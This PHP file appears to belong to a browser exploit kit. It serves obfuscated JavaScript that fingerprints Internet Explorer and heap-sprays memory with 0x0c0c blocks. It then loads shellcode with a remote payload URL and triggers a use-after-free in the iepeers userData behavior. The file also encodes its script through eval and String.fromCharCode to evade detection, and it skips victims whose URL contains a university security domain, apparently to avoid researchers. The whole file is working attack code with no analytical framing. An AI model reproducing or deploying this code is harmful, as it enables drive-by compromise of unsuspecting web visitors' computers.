<?php


function randFuncs($cagcajeedh, $becccffdjb) {
	$cfaefdjje = '';
	$ebjcjeejg = 0;

	while ($ebjcjeejg <= 150) {
		$cfaefdjje .= 'function ' . $cagcajeedh[$ebjcjeejg] . '(){ ' . $cagcajeedh[$ebjcjeejg + 1] . '(); }
';
		++$ebjcjeejg;
	}

	$cfaefdjje .= 'function ' . $cagcajeedh[$ebjcjeejg] . '(){ ' . $becccffdjb . '(); }
';
	return $cfaefdjje;
}

function enc($cdjfdihjbg) {
	$cagcajeedh = $GLOBALS['cpFunctions']->CreateArrayString( 6, '100' );
	$cdjfdihjbg = str_split( $cdjfdihjbg );
	$bfdhehhcbb = 'window[\'e' . $cagcajeedh[1] . 'v' . $cagcajeedh[1] . 'al\'.replace(/' . $cagcajeedh[1] . '/g,\'\')](String[\'f' . $cagcajeedh[1] . 'r' . $cagcajeedh[1] . 'o' . $cagcajeedh[1] . 'm' . $cagcajeedh[1] . 'C' . $cagcajeedh[1] . 'h' . $cagcajeedh[1] . 'a' . $cagcajeedh[1] . 'r' . $cagcajeedh[1] . 'C' . $cagcajeedh[1] . 'o' . $cagcajeedh[1] . 'd' . $cagcajeedh[1] . 'e\'.replace(/' . $cagcajeedh[1] . '/g,\'\')](';
	$ebjcjeejg = 0;

	while ($ebjcjeejg < count( $cdjfdihjbg )) {
		$bfdhehhcbb .= ord( $cdjfdihjbg[$ebjcjeejg] ) . ',';
		++$ebjcjeejg;
	}

	$bfdhehhcbb = substr( $bfdhehhcbb, 0, 0 - 1 ) . '));';
	return $bfdhehhcbb;
}

include( 'CP-ENC-7531.php' );
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$browser = $cpFunctions->GetBrowser( $user_agent );
$os = $cpFunctions->GetOS( $user_agent );
$strUrl = $GLOBALS['cpXplHelper']->GetURL( 'iepeers', $browser, $os, 'iepeers' );
$randomStrFunc = $GLOBALS['cpFunctions']->CreateArrayString( 8, '200' );
$randomStr = $GLOBALS['cpFunctions']->CreateArrayString( 6, '100' );

if (6 < $cpFunctions->MSIEVersion( $user_agent )) {
	$xxxx = CPackExploitHelper::randfuncs( $randomStrFunc, $randomStr[58], '' );
	echo '<script language=\'Javascript\'>';
	echo 'document.write(\'<M' . $randomStr[8] . 'A' . $randomStr[8] . 'R' . $randomStr[8] . 'QU' . $randomStr[8] . 'E' . $randomStr[8] . 'E ' . $randomStr[8] . 'i' . $randomStr[8] . 'd' . $randomStr[8] . '="' . $randomStr[13] . '" ' . $randomStr[8] . 'st' . $randomStr[8] . 'y' . $randomStr[8] . 'le' . $randomStr[8] . '="' . $randomStr[8] . 'b' . $randomStr[8] . 'eha' . $randomStr[8] . 'v' . $randomStr[8] . 'io' . $randomStr[8] . 'r: ' . $randomStr[8] . 'u' . $randomStr[8] . 'r' . $randomStr[8] . 'l(' . $randomStr[8] . '#' . $randomStr[8] . 'def' . $randomStr[8] . 'ault' . $randomStr[8] . '#' . $randomStr[8] . 'u' . $randomStr[8] . 'ser' . $randomStr[8] . 'Da' . $randomStr[8] . 'ta);"></M' . $randomStr[8] . 'AR' . $randomStr[8] . 'Q' . $randomStr[8] . 'U' . $randomStr[8] . 'E' . $randomStr[8] . 'E>\'.replace(/' . $randomStr[8] . '/g,\'\'));';
	echo $xxxx;
	echo '
function ' . $randomStr[59] . '(){
	var ' . $randomStr[50] . ' = "' . $randomStr[15] . '0c0c' . $randomStr[15] . '0c0c".replace(/' . $randomStr[15] . '/g,"%u").replace(/a/g,\'c\').replace(/9/g,\'0\');
	var ' . $randomStr[45] . ' = "' . $GLOBALS['cpXplHelper']->GetJSShellcode( $strUrl, $randomStr[41] ) . '".replace(/' . $randomStr[41] . '/g,"Au".replace(/A/g,"B").replace(/B/g,unescape("%25")));
	var ' . $randomStr[7] . '= unescape(' . $randomStr[50] . ');
	var ' . $randomStr[6] . '= unescape(' . $randomStr[45] . ');
 ' . $randomStr[8] . ' = new Array();
 var ' . $randomStr[9] . ' = 0x86000-(' . $randomStr[6] . '.length*2);
 while(' . $randomStr[7] . '.length<' . $randomStr[9] . '/2) { ' . $randomStr[7] . '+=' . $randomStr[7] . '; }
 var ' . $randomStr[10] . ' = ' . $randomStr[7] . '.substring(0,' . $randomStr[9] . '/2);
 delete ' . $randomStr[7] . ';
 for(' . $randomStr[11] . '=0; ' . $randomStr[11] . '<270; ' . $randomStr[11] . '++) {
  ' . $randomStr[8] . '[' . $randomStr[11] . '] = ' . $randomStr[10] . ' + ' . $randomStr[10] . ' + ' . $randomStr[6] . ';
 }
}
function ' . $randomStr[40] . '(){
		var ' . $randomStr[9] . ' = "' . CPackExploitHelper::randoccurance( $randomStr[15] ) . 'c' . CPackExploitHelper::randoccurance( $randomStr[15] ) . 's' . CPackExploitHelper::randoccurance( $randomStr[15] ) . '.' . CPackExploitHelper::randoccurance( $randomStr[15] ) . 'u' . CPackExploitHelper::randoccurance( $randomStr[15] ) . 'c' . CPackExploitHelper::randoccurance( $randomStr[15] ) . 's' . CPackExploitHelper::randoccurance( $randomStr[15] ) . 'b' . CPackExploitHelper::randoccurance( $randomStr[15] ) . '.' . CPackExploitHelper::randoccurance( $randomStr[15] ) . 'e' . CPackExploitHelper::randoccurance( $randomStr[15] ) . 'd' . CPackExploitHelper::randoccurance( $randomStr[15] ) . 'u".replace(/' . $randomStr[15] . '/g,\'\');
		var ' . $randomStr[10] . ' = window[\'' . $randomStr[15] . 'l' . $randomStr[15] . 'o' . $randomStr[15] . 'cat' . $randomStr[15] . 'i' . $randomStr[15] . 'o' . $randomStr[15] . 'n\'.replace(/' . $randomStr[15] . '/g,\'\')].href;
		var ' . $randomStr[11] . ' = ' . $randomStr[10] . '[\'' . $randomStr[15] . 's' . $randomStr[15] . 'e' . $randomStr[15] . 'ar' . $randomStr[15] . 'ch\'.replace(/' . $randomStr[15] . '/g,\'\')](' . $randomStr[9] . ');
		if(' . $randomStr[11] . ' != -1){
			return 0;
		}else{
			return 1;
		}
}
function ' . $randomStr[58] . '() {
 ' . $randomStr[59] . '();
 for (' . $randomStr[11] . ' = 1; ' . $randomStr[11] . ' <10; ' . $randomStr[11] . ' ++ ){
  ' . $randomStr[13] . '.setAttribute("' . $randomStr[12] . '",document.location);
 }
 ' . $randomStr[13] . '.setAttribute("' . $randomStr[12] . '",document.getElementsByName("style"));
 document.location="about:"+unescape("' . $randomStr[12] . 'u0c0c' . $randomStr[12] . 'u' . $randomStr[13] . '0' . $randomStr[13] . 'c0' . $randomStr[13] . 'c' . $randomStr[12] . 'u' . $randomStr[13] . '0' . $randomStr[13] . 'c' . $randomStr[13] . '0c' . $randomStr[12] . 'u' . $randomStr[13] . '0' . $randomStr[13] . 'c' . $randomStr[13] . '0' . $randomStr[13] . 'c".replace(/' . $randomStr[12] . '/g,\'%\').replace(/' . $randomStr[13] . '/g,\'\'))+"blank";
}

if(' . $randomStr[40] . '()){
	' . $randomStrFunc[0] . '();
}
';
	echo '</script>';
	return 1;
}

echo '<BUTTON ID=\'' . $randomStr[0] . '\' ONCLICK=\'' . $randomStr[1] . '();\'></BUTTON><script language=\'Javascript\'>';
echo CPackExploitHelper::randfuncs( $randomStrFunc, $randomStr[3], '' );
$root = '
var ' . $randomStr[9] . ' = document;
function ' . $randomStr[1] . '()
{
	var ' . $randomStr[2] . '=' . $randomStr[9] . '[\'' . $randomStr[9] . 'c' . $randomStr[9] . 'r' . $randomStr[9] . 'e' . $randomStr[9] . 'a' . $randomStr[9] . 't' . $randomStr[9] . 'e' . $randomStr[9] . 'E' . $randomStr[9] . 'l' . $randomStr[9] . 'e' . $randomStr[9] . 'm' . $randomStr[9] . 'e' . $randomStr[9] . 'n' . $randomStr[9] . 't' . $randomStr[9] . '\'.replace(/' . $randomStr[9] . '/g,\'\')](\'DIV\');
	' . $randomStr[2] . '[\'' . $randomStr[11] . 'a' . $randomStr[11] . 'd' . $randomStr[11] . 'd' . $randomStr[11] . 'B' . $randomStr[11] . 'e' . $randomStr[11] . 'h' . $randomStr[11] . 'a' . $randomStr[11] . 'v' . $randomStr[11] . 'i' . $randomStr[11] . 'o' . $randomStr[11] . 'r' . $randomStr[11] . '\'.replace(/' . $randomStr[11] . '/g,\'\')](\'' . $randomStr[3] . '#' . $randomStr[3] . 'd' . $randomStr[3] . 'e' . $randomStr[3] . 'f' . $randomStr[3] . 'a' . $randomStr[3] . 'u' . $randomStr[3] . 'l' . $randomStr[3] . 't' . $randomStr[3] . '#' . $randomStr[3] . 'u' . $randomStr[3] . 's' . $randomStr[3] . 'e' . $randomStr[3] . 'r' . $randomStr[3] . 'D' . $randomStr[3] . 'a' . $randomStr[3] . 't' . $randomStr[3] . 'a' . $randomStr[3] . '\'.replace(/' . $randomStr[3] . '/g,\'\'));
	document[\'' . $randomStr[2] . 'a' . $randomStr[2] . 'p' . $randomStr[2] . 'p' . $randomStr[2] . 'e' . $randomStr[2] . 'n' . $randomStr[2] . 'd' . $randomStr[2] . 'C' . $randomStr[2] . 'h' . $randomStr[2] . 'i' . $randomStr[2] . 'l' . $randomStr[2] . 'd' . $randomStr[2] . '\'.replace(/' . $randomStr[2] . '/g,\'\')](' . $randomStr[2] . ');
	try{
		for (i=0;i<10;i++){
			' . $randomStr[2] . '[\'' . $randomStr[2] . 's' . $randomStr[2] . 'e' . $randomStr[2] . 't' . $randomStr[2] . 'A' . $randomStr[2] . 't' . $randomStr[2] . 't' . $randomStr[2] . 'r' . $randomStr[2] . 'i' . $randomStr[2] . 'b' . $randomStr[2] . 'u' . $randomStr[2] . 't' . $randomStr[2] . 'e' . $randomStr[2] . '\'.replace(/' . $randomStr[2] . '/g,\'\')](\'s\',window);
		}
	}
	catch(e){}
	window[\'s' . $randomStr[2] . 't' . $randomStr[2] . 'a' . $randomStr[2] . 't' . $randomStr[2] . 'u' . $randomStr[2] . 's' . $randomStr[2] . '\'.replace(/' . $randomStr[2] . '/g,\'\')] +=\'\';
}
function ' . $randomStr[40] . '(){
		var ' . $randomStr[9] . ' = "' . CPackExploitHelper::randoccurance( $randomStr[15] ) . 'c' . CPackExploitHelper::randoccurance( $randomStr[15] ) . 's' . CPackExploitHelper::randoccurance( $randomStr[15] ) . '.' . CPackExploitHelper::randoccurance( $randomStr[15] ) . 'u' . CPackExploitHelper::randoccurance( $randomStr[15] ) . 'c' . CPackExploitHelper::randoccurance( $randomStr[15] ) . 's' . CPackExploitHelper::randoccurance( $randomStr[15] ) . 'b' . CPackExploitHelper::randoccurance( $randomStr[15] ) . '.' . CPackExploitHelper::randoccurance( $randomStr[15] ) . 'e' . CPackExploitHelper::randoccurance( $randomStr[15] ) . 'd' . CPackExploitHelper::randoccurance( $randomStr[15] ) . 'u".replace(/' . $randomStr[15] . '/g,\'\');
		var ' . $randomStr[10] . ' = window[\'' . $randomStr[15] . 'l' . $randomStr[15] . 'o' . $randomStr[15] . 'cat' . $randomStr[15] . 'i' . $randomStr[15] . 'o' . $randomStr[15] . 'n\'.replace(/' . $randomStr[15] . '/g,\'\')].href;
		var ' . $randomStr[11] . ' = ' . $randomStr[10] . '[\'' . $randomStr[15] . 's' . $randomStr[15] . 'e' . $randomStr[15] . 'ar' . $randomStr[15] . 'ch\'.replace(/' . $randomStr[15] . '/g,\'\')](' . $randomStr[9] . ');
		if(' . $randomStr[11] . ' != -1){
			return 0;
		}else{
			return 1;
		}
}';
echo enc( $root );
echo '
function ' . $randomStr[3] . '(){
	if(' . $randomStr[40] . '()){
	var ' . $randomStr[4] . ';
	var ' . $randomStr[50] . ' = "' . $randomStr[15] . '9a9a' . $randomStr[15] . '9a9a".replace(/' . $randomStr[15] . '/g,"%u").replace(/a/g,\'c\').replace(/9/g,\'0\');
	var ' . $randomStr[45] . ' = "' . $GLOBALS['cpXplHelper']->GetJSShellcode( $strUrl, $randomStr[41] ) . '".replace(/' . $randomStr[41] . '/g,"Au".replace(/A/g,"B").replace(/B/g,unescape("%25")));
	var ' . $randomStr[7] . '= unescape(' . $randomStr[50] . ');
	var ' . $randomStr[6] . '= unescape(' . $randomStr[45] . ');';
$root = 'var ' . $randomStr[8] . '=528384-' . $randomStr[6] . '.length*2;';
echo $root;
echo '
	while(' . $randomStr[7] . '.length <= ' . $randomStr[8] . ') ' . $randomStr[7] . '+=' . $randomStr[7] . ';';
$root = '
	' . $randomStr[7] . '=' . $randomStr[7] . '.substring(0,' . $randomStr[8] . ' - ' . $randomStr[6] . '.length);
	';
echo enc( $root );
echo '
	' . $randomStr[4] . '=new Array();
	for(i=0;i<0x100;i++){
		' . $randomStr[4] . '[i]=' . $randomStr[7] . ' + ' . $randomStr[6] . ';
	}
	CollectGarbage();
	document.getElementById(\'' . $randomStr[0] . '\').onclick();
	}
}
if(' . $randomStr[40] . '()){
	' . $randomStrFunc[0] . '();
}';
echo '</script>';
?>
